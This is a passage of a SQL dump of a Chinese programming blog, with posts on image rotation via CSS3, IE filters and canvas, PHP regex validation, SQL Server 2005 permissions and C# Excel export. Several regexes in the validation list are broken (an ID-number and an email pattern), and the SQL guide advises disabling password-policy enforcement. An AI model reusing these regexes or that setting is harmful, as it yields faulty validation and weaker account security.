/>\r\n三、IE滤镜与图片旋转</p>\r\n\r\n<p>IE的filter滤镜其实不算个太好的东西，我个人感觉是这样，像个性格孤僻的自以为是的独裁者，但是，很多时候，没有办法，还是得想到它。要说目前IE下最简单的实现图片旋转的效果，那莫过于其私有的滤镜属性了。</p>\r\n\r\n<p>首先，简单点的，实现与上例类似的效果，代码如下：<br />\r\nfilter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3);</p>\r\n\r\n<p>结果与上面的效果一致：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731105921878408.jpg\" style=\"height:145px; width:109px\" /></p>\r\n\r\n<p>这里，滤镜代码部分，前面长长的大小写错综的部分我们不用管它，看后面的&rdquo;rotation=3&Prime;这是关键，这里的参数可以是0，1，2，3，没有4，要是是4啊，5啊之类的，图片就不旋转了。旋转的角度只要将这些数值乘以90(&pi;/2)就可以了，所以呢&rdquo;rotation=3&Prime;表示顺时针旋转270度，与transform:rotate(270deg);是一个意思。所以，这里，就会有些小小的局限&mdash;&mdash;不能实现任意角度的旋转，只能是90度，180度以及270度。但是，IE浏览器不是个简单的罗罗，要实现任意角度的旋转，它还是有办法的，只是要比上面的麻烦些，难理解些，要用到矩阵变换滤镜。</p>\r\n\r\n<p>ps:据说，纯粹是据说，目前为止我没遇到过，IE8浏览器（在非标准模式下），在CSS中，要使用&ldquo;-ms-filter&rdquo;代替&ldquo;filter&rdquo;。</p>\r\n\r\n<p>先上实例代码，以下代码将实现图片顺指针旋转60度的效果：<br />\r\nfilter:progid:DXImageTransform.Microsoft.Matrix(M11=0.5,M12=-0.866,M21=0.866,M22=0.5,SizingMethod=&#39;auto expand&#39;);</p>\r\n\r\n<p>结果呢，IE6下的效果就是：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731105952633825.jpg\" style=\"height:181px; width:153px\" /></p>\r\n\r\n<p>这里滤镜参数好像比较多，看得人心里毛毛的，不过呢，拆开来看，也是小家常。</p>\r\n\r\n<p>我们要关注的其实就只是这一部分：&rdquo;M11=0.5,M12=-0.866,M21=0.866,M22=0.5&Prime;，有人可能会问，这里的几个数值是怎么来的，答案很简单 &ndash; &ldquo;计算来的&rdquo;。假设我们要旋转的角度是rotation，则计算过程如下：</p>\r\n\r\n<p>sin = sin(roation);cos = cos(roation);<br />\r\nM11 = cos;M12 = -sin;M21 = sin;M22 = cos;</p>\r\n\r\n<p>例如这里要旋转60度，即rotation=60，所以sin = sin(60) = 0.866, cos = cos(60) = 0.5，于是就有了&rdquo;M11=0.5,M12=-0.866,M21=0.866,M22=0.5&Prime;。所以呢，要实现IE下任意角度图片的旋转记住下面的式子就可以了：filter:progid:DXImageTransform.Microsoft.Matrix(M11=cos(roation),M12=-sin(roation),M21=sin(roation),M22=cos(roation),SizingMethod=&#39;auto expand&#39;);</p>\r\n\r\n<p>这个矩阵滤镜还可以实现进行缩放，对此不详述。<br />\r\n四、CSS3与IE滤镜图片旋转综合与对比</p>\r\n\r\n<p>不管三七二十一，先看一个综合实例，方便对比。<br />\r\n实现旋转90度和135度两个效果，CSS部分代码如下：<br />\r\n#rot90{-moz-transform:rotate(90deg); -webkit-transform:rotate(90deg); transform:rotate(90deg); filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);}<br />\r\n#rot135{-moz-transform:rotate(135deg); -webkit-transform:rotate(135deg); transform:rotate(135deg); filter:progid:DXImageTransform.Microsoft.Matrix(M11=-0.707,M12=-0.707,M21=0.707,M22=-0.707,SizingMethod=&#39;auto expand&#39;);}</p>\r\n\r\n<p>HTML部分：<br />\r\n&lt;img id=&quot;rot90&quot; width=&quot;128&quot; height=&quot;96&quot; src=&quot;http://image.zhangxinxu.com/image/study/s/s128/mm1.jpg&quot; /&gt;旋转90&deg;<br />\r\n&lt;img id=&quot;rot135&quot; width=&quot;128&quot; height=&quot;96&quot; src=&quot;http://image.zhangxinxu.com/image/study/s/s128/mm1.jpg&quot; /&gt;旋转135&deg;</p>\r\n\r\n<p>以下为IE和Firefox下的对比图：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731110022159875.jpg\" style=\"height:367px; width:473px\" /></p>\r\n\r\n<p>正如上图标注的，虽然看上去实现的旋转效果是一样的，但实际上CSS3下的旋转不改变原始图片占据的空间的大小，所以您会看到使用CSS3 transform旋转的图片可那会覆盖在其他元素上，但是IE却不是如此，图片占据空间的大小一致是跟着旋转后的图片走的，所以IE滤镜实现的旋转就不会看到图片覆盖其他元素的情况，因为它会把它们挤开。</p>\r\n\r\n<p>如果不考虑在中国使用率极低的Opera浏览器以及比较较低的Firefox2以及以下的浏览器，事情（图片旋转）似乎变得很容易。<br />\r\n，我们似乎可以轻松的实现图片的旋转&mdash;&mdash;例如开始新浪微博图片旋转截图效果的实现只要变变class类就可以了。但是，我们可以放弃Opera浏览器以及Firefox2及以下版本的浏览器了吗？这要看你网站的目标群体，大小，及性质了。在目前的状况下，一般而言，是放弃不得了，这就迫使我们另谋出路，这就是HTML5中的canvas标签。<br />\r\n五、canvas标签与图片旋转</p>\r\n\r\n<p>首先简单讲讲canvas标签，canvas属于HTML元素，是为了客户端矢量图形而设计的。它自己没有行为，但却把一个绘图 API 展现给客户端 JavaScript 以使脚本能够把想绘制的东西都绘制到一块画布上。</p>\r\n\r\n<p>&lt;canvas&gt; 标记由 Apple 在 Safari 1.3 Web 浏览器中引入。对 HTML 的这一根本扩展的原因在于，HTML 在 Safari 中的绘图能力也为 Mac OS X 桌面的 Dashboard 组件所使用，并且 Apple 希望有一种方式在 Dashboard 中支持脚本化的图形。Firefox 1.5 和 Opera 9 都跟随了 Safari 的引领。这两个浏览器都支持 &lt;canvas&gt; 标记（使用js插件也可以使IE支持canvas标签）。所以，虽然纯粹的CSS不能照顾到Opera浏览器以及低版本的Firefox，没有关系，我们可以使用canvas标签。</p>\r\n\r\n<p>canvas只是有一个基于 JavaScript 的绘图 API，所以说要使用canvas绘图离不开JavaScript，题外话不说，我们看怎样利用canvas+JavaScript实现图片的旋转吧。</p>\r\n\r\n<p>这里IE先放在一边，我们看看如何使用canvas实现旋转90度的效果，代码如下：<br />\r\nHTML部分<br />\r\n&lt;canvas id=&quot;cv&quot;&gt;&lt;/canvas&gt;<br />\r\n&lt;img id=&quot;cvImg&quot; width=&quot;128&quot; height=&quot;96&quot; src=&quot;http://image.zhangxinxu.com/image/study/s/s128/mm1.jpg&quot; /&gt;<br />\r\nJavaScript部分<br />\r\nwindow.onload = function(){<br />\r\nvar canvas = document.getElementById(&quot;cv&quot;);<br />\r\nvar oImg = document.getElementById(&quot;cvImg&quot;);<br />\r\n//旋转后canvas标签的大小<br />\r\ncanvas.height = 128;<br />\r\ncanvas.width = 96;<br />\r\n//绘图开始<br />\r\nvar context = canvas.getContext(&quot;2d&quot;);<br />\r\ncontext.save();<br />\r\n//改变中心点<br />\r\ncontext.translate(96,0);<br />\r\n//旋转90&deg;<br />\r\ncontext.rotate(Math.PI/2);<br />\r\n//绘制<br />\r\ncontext.drawImage(oImg, 0, 0, 128, 96);<br />\r\ncontext.restore();<br />\r\noImg.style.display = &quot;none&quot;;<br />\r\n};</p>\r\n\r\n<p>结果在不支持CSS3 transform的Opera9浏览器下：</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150731110057850256.jpg\" style=\"height:141px; width:200px\" /></p>\r\n\r\n<p>如果要让IE下也有同样的效果，很简单，加上这么句代码：<br />\r\n&lt;!- -[if IE]&gt;&lt;script type=&quot;text/javascript&quot; src=&quot;http://www.zhangxinxu.com/style/js/excanvas.js&quot;&gt;&lt;/script&gt;&lt;![endif]- -&gt;（这里为了防止注释冲突，双连线用空格隔开了）</p>\r\n\r\n<p>其中链接的js文件是使IE浏览器也支持canvas标签的插件JavaScript，能实现大多数canvas标签实现的效果，图片的旋转当然不在话下，您可以试试。<br />\r\n六、旋转效果jQuery插件</p>\r\n\r\n<p>通过上面的一些探讨，其实可以发现实现图片旋转的方法其实不少，这里介绍的这个jQuery插件使用的方法是：IE下滤镜+其他浏览器canvas的方法。</p>\r\n\r\n<p>您可以狠狠地点击这里：旋转效果jQuery插件下载</p>\r\n\r\n<p>插件压缩后不足2k，是款很轻量级的插件，很精巧。可以实现任意角度图片的旋转，使用方法也很简单。例如：$(&quot;imgRotate&quot;).rotate(90);就是表示旋转90度了，如果要实现向左转与向右转，有专门的方法，就是$(&ldquo;选择器&rdquo;).rotateLeft(); 与 $(&ldquo;选择器&rdquo;).rotateRight();</p>\r\n\r\n<p>具体使用实例参见下一部分。<br />\r\n七、图片旋转实例</p>\r\n\r\n<p>本实例要实现的效果就是新浪微博上的图片的&ldquo;向左转&rdquo;和&ldquo;向右转&rdquo;效果。将使用三种方法，一是忽略低版本Firefox与Opera浏览器的CSS方法；二是使用jQuery插件实现效果的示例；三是纯粹canvas标签无JavaScript库支持实现的方法。</p>\r\n\r\n<p>不完全兼容的CSS方法<br />\r\n此方法的原理很简单，切换HTML元素对象（图片）的class。如下CSS代码：<br />\r\n.rot1{-moz-transform:rotate(90deg); -webkit-transform:rotate(90deg); transform:rotate(90deg); filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=1);}<br />\r\n.rot2{-moz-transform:rotate(180deg); -webkit-transform:rotate(180deg); transform:rotate(180deg); filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=2);}<br />\r\n.rot3{-moz-transform:rotate(270deg); -webkit-transform:rotate(270deg); transform:rotate(270deg); filter:progid:DXImageTransform.Microsoft.BasicImage(rotation=3);}</p>\r\n\r\n<p>再添加简单的JavaScript代码&mdash;&mdash;根据是向左转还是向右转动态改变class的名称就行了。<br />\r\n这里使用的是CSS3+filter滤镜的方法，所以低版本的Firefox以目前版本的Opera浏览器下式没有效果的。但绝对适用于90%以上的互联网用户了。</p>\r\n\r\n<p>您可以狠狠地点击这里：相关demo页面</p>\r\n\r\n<p>jQuery插件实现方法<br />\r\n使用插件一般而言是比较简单的。但是这里，由于插件js是款相当轻量级的代码插件，功能有限。如果不做任何特别的处理的话，此插件只支持一次的图片旋转效果，因为分析插件可知，当运行一次canvas旋转后，canvas标签会将原来的图片标签代替掉，使得图片的连续旋转遇到麻烦，需要每次旋转后重新输入图片相关的HTML代码。<br />\r\n上面所述对应的JavaScript代码如下：<br />\r\nparam.right.click(function(){<br />\r\nif(!$(&quot;img#rotImg&quot;).length){<br />\r\nparam.box.html(&#39;&lt;img id=&quot;rotImg&quot; src=&quot;http://image.zhangxinxu.com/image/study/s/s512/mm1.jpg&quot; /&gt;&#39;);<br />\r\n}<br />\r\nfun.right(); //执行向右旋转<br />\r\nreturn false;<br />\r\n});</p>\r\n\r\n<p>js部分需要调养jQuery库和此轻量级旋转插件，至于详细的代码，您可以参见demo。</p>\r\n\r\n<p>您可以狠狠地点击这里：jQuery插件实现demo</p>\r\n\r\n<p>说明：此效果在IE下似乎有点问题，经常会有点击无旋转，再点击跳过刚才旋转的情况，我不清楚是次插件的问题，还是IE浏览器对filter矩阵滤镜数据变换效果的bug，还是自己js部分由问题，希望谁知道原因可以告诉一声，不甚感谢！</p>\r\n\r\n<p>canvas方法<br />\r\n此方法不依赖任何的JavaScript库，兼容性强，而且没有出现一些不知名的问题，我自己是比较喜欢的。为了让其在IE下也支持canvas标签，需要调用一个js插件，由Google发起。此插件下载：excanvas.js</p>\r\n\r\n<p>您可以狠狠地点击这里：canvas方法图片旋转demo页面</p>\r\n\r\n<p>由于此方法我个人比较推荐，所以提供源文件下载。您可以狠狠地点击这里：canvas方法源文件下载(9.44K)<br />\r\n八、最后的唠叨</p>\r\n\r\n<p>对于图片旋转的jQuery插件还有更强大的，例如：jQueryRotate.js，您有兴趣可以去网上搜一搜，其他的就不多说了，总之，希望对您的学习有所帮助。</p>\r\n\r\n<p>还有，如果您发现文章中有表述不准确，欢迎提出来，也欢迎交流相关问题，你可以通过文章评论或是去这里进行一对一问答交流。</p>\r\n\r\n<p>原创文章，转载请注明来自张鑫旭-鑫空间-鑫生活[http://www.zhangxinxu.com]<br />\r\n本文地址：http://www.zhangxinxu.com/wordpress/?p=552</p>\r\n',0,1438311692,0,0);
INSERT INTO `blog` VALUES (116,10,'php验证数字','<p>数字正则过滤[code]if(preg_match(&quot;/^\\d*$/&quot;,$fgid))&nbsp;&nbsp;&nbsp; echo(&#39;是数字&#39;);<br />\r\nelse&nbsp;&nbsp; echo(&#39;不是数字&#39;);[/code]或者用函数[code]if(is_numeric($fgid)) echo(&#39;是数字&#39;);<br />\r\nelse echo(&#39;不是数字&#39;);[/code]这两种方法的区别是&nbsp; is_numeric小数也会认为是数字，而前面正则会把小数点当作字符。</p>\r\n\r\n<p>附一些常用的正则运算：</p>\r\n\r\n<p>验证数字：^[0-9]*$<br />\r\n验证n位的数字：^\\d{n}$<br />\r\n验证至少n位数字：^\\d{n,}$<br />\r\n验证m-n位的数字：^\\d{m,n}$<br />\r\n验证零和非零开头的数字：^(0|[1-9][0-9]*)$<br />\r\n验证有两位小数的正实数：^[0-9]+(\\.[0-9]{2})?$<br />\r\n验证有1-3位小数的正实数：^[0-9]+(\\.[0-9]{1,3})?$<br />\r\n验证非零的正整数：^\\+?[1-9][0-9]*$<br />\r\n验证非零的负整数：^\\-[1-9][0-9]*$<br />\r\n验证非负整数（正整数 + 0）&nbsp; ^\\d+$<br />\r\n验证非正整数（负整数 + 0）&nbsp; ^((-\\d+)|(0+))$<br />\r\n验证长度为3的字符：^.{3}$<br />\r\n验证由26个英文字母组成的字符串：^[A-Za-z]+$<br />\r\n验证由26个大写英文字母组成的字符串：^[A-Z]+$<br />\r\n验证由26个小写英文字母组成的字符串：^[a-z]+$<br />\r\n验证由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$<br />\r\n验证由数字、26个英文字母或者下划线组成的字符串：^\\w+$<br />\r\n验证用户密码:^[a-zA-Z]\\w{5,17}$ 正确格式为：以字母开头，长度在6-18之间，只能包含字符、数字和下划线。<br />\r\n验证是否含有 ^%&amp;&lsquo;,;=?$\\&rdquo; 等字符：[^%&amp;&lsquo;,;=?$\\x22]+<br />\r\n验证汉字：^[\\一-\\龥],{0,}$<br />\r\n验证Email地址：^\\w+[-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$<br />\r\n验证InternetURL：^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$ ；^[a-zA-z]+://(w+(-w+)*)(.(w+(-w+)*))*(?S*)?$<br />\r\n验证电话号码：^(\\(\\d{3,4}\\)|\\d{3,4}-)?\\d{7,8}$：&ndash;正确格式为：XXXX-XXXXXXX，XXXX-XXXXXXXX，XXX-XXXXXXX，XXX-XXXXXXXX，XXXXXXX，XXXXXXXX。<br />\r\n验证身份证号（15位或18位数字）：^\\d{15}|\\d{}18$<br />\r\n验证一年的12个月：^(0?[1-9]|1[0-2])$ 正确格式为：&ldquo;01&rdquo;-&ldquo;09&rdquo;和&ldquo;1&rdquo;&ldquo;12&rdquo;<br />\r\n验证一个月的31天：^((0?[1-9])|((1|2)[0-9])|30|31)$&nbsp;&nbsp;&nbsp; 正确格式为：01、09和1、31。<br />\r\n整数：^-?\\d+$<br />\r\n非负浮点数（正浮点数 + 0）：^\\d+(\\.\\d+)?$<br />\r\n正浮点数&nbsp;&nbsp; ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$<br />\r\n非正浮点数（负浮点数 + 0） ^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$<br />\r\n负浮点数&nbsp; ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$<br />\r\n浮点数&nbsp; ^(-?\\d+)(\\.\\d+)?</p>\r\n',0,1438311818,0,0),(117,44,'SQL2005 权限分配','<p>1. SQL数据库分配权限<br />\r\n打开SQL-Server管理工具安全性登陆名右键(新建登陆名)<br />\r\n&nbsp;<br />\r\n输入相应的信息(这里要去掉强制实施密码策略，强制密码过期，用户在下次登录时必须修改密码的选择)<br />\r\n&nbsp;<br />\r\n用户映射选择我们要设置权限的数据库通过选择数据库角色成员身份来设置新建用户的权限<br />\r\n&nbsp;<br />\r\n一般对整个库做权限的时候都是需要所有权限勾选db_owner就可以了(确定)<br />\r\n这样就可以用我们新建的这个用户名来访问我们的数据库服务器了，而且这个用户名只拥有我们所勾选的数据库的所有权限。</p>\r\n\r\n<p>2. SQL数据库对每个表分配权限</p>\r\n\r\n<p>打开SQL-Server管理工具安全性登陆名右键(新建登陆名)<br />\r\n&nbsp;<br />\r\n输入相应的信息(这里要去掉强制实施密码策略，强制密码过期，用户在下次登录时必须修改密码的选择)<br />\r\n&nbsp;<br />\r\n用户映射选择我们要设置权限的数据库通过选择数据库角色成员身份来设置新建用户的权限<br />\r\n&nbsp;<br />\r\n因为我们要对每个表进行单独的设置所以这里我们就不勾选db_owner了</p>\r\n\r\n<p>打开我们刚才勾选的test数据库安全性用户中看到我们刚才新建的那个用户了。<br />\r\n&nbsp;<br />\r\n找到新建的用户名右键属性<br />\r\n&nbsp;<br />\r\n安全对像<br />\r\n&nbsp;<br />\r\n添加<br />\r\n&nbsp;<br />\r\n特定类型的所有对象确定<br />\r\n&nbsp;<br />\r\n对象类型选择表<br />\r\n&nbsp;<br />\r\n确定这样我们就能看到test数据库中的所有表了<br />\r\n&nbsp;<br />\r\n接着我们再对每个表设置权限</p>\r\n\r\n<p>我对两个表都是设置的Select权限确定这样我们用test_name登陆test数据库的时候只能对其中的两个表做Select操作不能做其它操作</p>\r\n',0,1438312269,0,0),(118,38,'C#将datatable导出到excel(数字是数字格式)','<p>using System.IO; &nbsp;<br />\r\nusing Microsoft.Office.Core; &nbsp;<br />\r\nusing Excel = Microsoft.Office.Interop.Excel;</p>\r\n\r\n<p>public bool ExportFile(System.Data.DataTable dt)<br />\r\n{<br />\r\n&nbsp;SaveFileDialog sfd = new SaveFileDialog();<br />\r\n&nbsp;sfd.Filter = &quot;Excel文件(*.xls)|*.xls|所有文件(*.*)|*.*&quot;;<br />\r\n&nbsp;sfd.Title = &quot;Excel文件导出&quot;;<br />\r\n&nbsp;string fileName = &quot;&quot;;<br />\r\n&nbsp;if (sfd.ShowDialog() == DialogResult.OK)<br />\r\n&nbsp;{<br />\r\n&nbsp; fileName = sfd.FileName;<br />\r\n&nbsp; Excel.Application app = new Excel.Application();<br />\r\n&nbsp; if (app == null)<br />\r\n&nbsp; {<br />\r\n&nbsp;&nbsp; MessageBox.Show(&quot;Excel启动失败！&quot;);<br />\r\n&nbsp;&nbsp; return false;<br />\r\n&nbsp; }<br />\r\n&nbsp; try<br />\r\n&nbsp; {<br />\r\n&nbsp;&nbsp; app.Visible = false;<br />\r\n&nbsp;&nbsp; Excel.Workbook xlWorkBook = app.Workbooks.Add(Type.Missing);<br />\r\n&nbsp;&nbsp; Excel.Worksheet xlWorkSheet = (Excel.Worksheet)xlWorkBook.Worksheets.get_Item(1);<br />\r\n&nbsp;&nbsp; int i;<br />\r\n&nbsp;&nbsp; for (i = 0; i &lt; dt.Columns.Count; i++)<br />\r\n&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; xlWorkSheet.Cells[1, i + 1] = dt.Columns[i].ColumnName;<br />\r\n&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; for (i = 0; i &lt; dt.Rows.Count; i++)<br />\r\n&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp; for (int j = 0; j &lt; dt.Columns.Count; j++)<br />\r\n&nbsp;&nbsp;&nbsp; {<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; xlWorkSheet.Cells[i + 2, j + 1] = dt.Rows[i][j].ToString();<br />\r\n&nbsp;&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; }<br />\r\n&nbsp;&nbsp; xlWorkBook.SaveAs(fileName, Excel.XlFileFormat.xlWorkbookNormal, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Excel.XlSaveAsAccessMode.xlExclusive, Type.Missing, Type.Missing, Type.Missing, Type.Missing, Type.Missing);<br />\r\n&nbsp;&nbsp; xlWorkBook.Close(true, Type.Missing, Type.Missing);<br />\r\n&nbsp;&nbsp; app.Quit();</p>\r\n\r\n<p>&nbsp;&nbsp; ReleaseObject(xlWorkSheet);<br />\r\n&nbsp;&nbsp; ReleaseObject(xlWorkBook);<br />\r\n&nbsp;&nbsp; ReleaseObject(app);<br />\r\n&nbsp;&nbsp; return true;<br />\r\n&nbsp; }<br />\r\n&nbsp; catch (System.Exception exc)<br />\r\n&nbsp; {<br />\r\n&nbsp;&nbsp; MessageBox.Show(&quot;excel运行错误：&quot;+exc.Message);<br />\r\n&nbsp;&nbsp; return false;<br />\r\n&nbsp; }</p>\r\n\r\n<p>&nbsp;}<br />\r\n&nbsp;else<br />\r\n&nbsp;{<br />\r\n&nbsp; return false;<br />\r\n&nbsp;}<br />\r\n}</p>\r\n',0,1438312371,0,0),(119,38,'c#导出excel示例代码','<p>using System;</p>\r\n\r\n<p>using System.Collections.Generic;</p>\r\n\r\n<p>using System.Text;</p>\r\n\r\n<p>using System.IO;</p>\r\n\r\n<p>using System.Data;</p>\r\n\r\n<p>using System.Windows.Forms;</p>\r\n\r\n<p>using Microsoft.Office.Interop.Excel;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>namespace AssetsManage.Operation</p>\r\n\r\n<p>{</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; class Export</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static System.Windows.Forms.DataGridView gridView;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static System.Windows.Forms.ToolStripProgressBar&nbsp; toolStripProgressBar1;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static Timer time;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static DataSet objSet = new DataSet();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static SaveFileDialog saveFileDialog = new SaveFileDialog();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private static SaveFileDialog saveFileDialog2 = new SaveFileDialog();</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static System.Windows.Forms.DataGridView _gridView</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get { return gridView; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set { gridView = value;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static System.Windows.Forms.ToolStripProgressBar _toolStripProgressBar1</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get { return toolStripProgressBar1; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set { toolStripProgressBar1 = value;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static Timer _time</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get { return time; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set { time = value;}</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static DataSet _objSet</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; get { return objSet; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set { objSet.Clear(); objSet = value; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //导出当前页DataGridView中的数据到EXcel中</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public static void ExportTOExcel()</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (gridView.Rows.Count == 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MessageBox.Show(&quot;没有数据可供导出！&quot;, &quot;提示&quot;, MessageBoxButtons.OK, MessageBoxIcon.Information);</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog.Filter = &quot;Execl files (*.xls)|*.xls&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog.FilterIndex = 0;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog.RestoreDirectory = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog.CreatePrompt = true;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog.Title = &quot;导出文件保存路径&quot;;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; saveFileDialog.ShowDialog();</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; string strName = saveFileDialog.FileName;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (strName.Length != 0)</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 